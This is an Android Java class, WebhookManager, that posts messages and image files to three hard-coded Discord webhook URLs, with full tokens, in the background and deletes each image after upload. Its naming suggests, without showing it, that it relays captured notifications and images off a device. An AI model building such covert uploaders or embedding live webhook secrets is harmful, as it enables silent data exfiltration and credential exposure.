package com.truth;

import android.util.Log;
import org.json.JSONObject;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class WebhookManager {
    private static final String TAG = "WebhookManager";
    private static final ExecutorService executor = Executors.newSingleThreadExecutor();

    public static final String WEBHOOK_NOTIFICATIONS = "https://discord.com/api/webhooks/1488794472300019844/K-0JcNacsQ-PFtrLW3Ie3Ia77ouSjIDCJBhs6pNci9M9Rldi43lX4YJdN1Q3FVG51m7N";
    public static final String WEBHOOK_IMAGES = "https://discord.com/api/webhooks/1488794589967155312/A3mC2L3PoSoJOo667FLS35GwClKAv4CQ1xsmb4h9q_PndEKwzzFYNNng_YO5tSsFvD6-";
    public static final String WEBHOOK_LOGS = "https://discord.com/api/webhooks/1488794662289412126/nTXlH2FXRzr2PAwAwICaw6jAktAGyHnyAFBxkE4IGHkSVNb15qQKv6XyrsZVF3WgBc7D";

    public static void sendMessage(final String webhookUrl, final String sender, final String msg) {
        executor.execute(() -> {
            String payload = "aplication: " + sender + ": " + msg;
            sendPayload(webhookUrl, payload, 0);
        });
    }

    private static void sendPayload(String webhookUrl, String content, int attempt) {
        HttpURLConnection conn = null;
        try {
            URL url = new URL(webhookUrl);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);

            JSONObject json = new JSONObject();
            json.put("content", content);

            OutputStream os = conn.getOutputStream();
            os.write(json.toString().getBytes("UTF-8"));
            os.flush();
            os.close();

            int code = conn.getResponseCode();
            if (code >= 200 && code < 300) {
                Log.d(TAG, "Message sent successfully to " + webhookUrl);
            } else if (attempt < 3) {
                retry(webhookUrl, content, attempt + 1);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error sending webhook", e);
            if (attempt < 3) retry(webhookUrl, content, attempt + 1);
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    public static void sendImage(final String webhookUrl, final String sender, final String msg, final File imageFile) {
        executor.execute(() -> {
            String content = "aplication: " + sender + ": " + msg;
            sendMultipart(webhookUrl, content, imageFile, 0);
        });
    }

    private static void sendMultipart(String webhookUrl, String content, File file, int attempt) {
        String boundary = "---" + System.currentTimeMillis();
        HttpURLConnection conn = null;
        try {
            URL url = new URL(webhookUrl);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            conn.setDoOutput(true);

            OutputStream os = conn.getOutputStream();
            PrintWriter writer = new PrintWriter(new OutputStreamWriter(os, "UTF-8"), true);

            // payload_json part
            JSONObject payloadJson = new JSONObject();
            payloadJson.put("content", content);
            
            writer.append("--").append(boundary).append("\r\n");
            writer.append("Content-Disposition: form-data; name=\"payload_json\"\r\n");
            writer.append("Content-Type: application/json; charset=UTF-8\r\n\r\n");
            writer.append(payloadJson.toString()).append("\r\n");

            // file part
            writer.append("--").append(boundary).append("\r\n");
            writer.append("Content-Disposition: form-data; name=\"file\"; filename=\"").append(file.getName()).append("\"\r\n");
            writer.append("Content-Type: image/png\r\n\r\n");
            writer.flush();

            FileInputStream fis = new FileInputStream(file);
            byte[] buffer = new byte[4096];
            int read;
            while ((read = fis.read(buffer)) != -1) {
                os.write(buffer, 0, read);
            }
            os.flush();
            fis.close();
            
            writer.append("\r\n");
            writer.append("--").append(boundary).append("--\r\n");
            writer.flush();
            writer.close();

            int code = conn.getResponseCode();
            if (code >= 200 && code < 300) {
                Log.d(TAG, "Image sent successfully");
                file.delete(); // Delete local copy after sending
            } else if (attempt < 3) {
                retryMultipart(webhookUrl, content, file, attempt + 1);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error sending image webhook", e);
            if (attempt < 3) retryMultipart(webhookUrl, content, file, attempt + 1);
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    private static void retry(String url, String content, int attempt) {
        long delay = (long) Math.pow(2, attempt) * 1000;
        try { Thread.sleep(delay); } catch (InterruptedException ignored) {}
        sendPayload(url, content, attempt);
    }

    private static void retryMultipart(String url, String content, File file, int attempt) {
        long delay = (long) Math.pow(2, attempt) * 1000;
        try { Thread.sleep(delay); } catch (InterruptedException ignored) {}
        sendMultipart(url, content, file, attempt);
    }
}
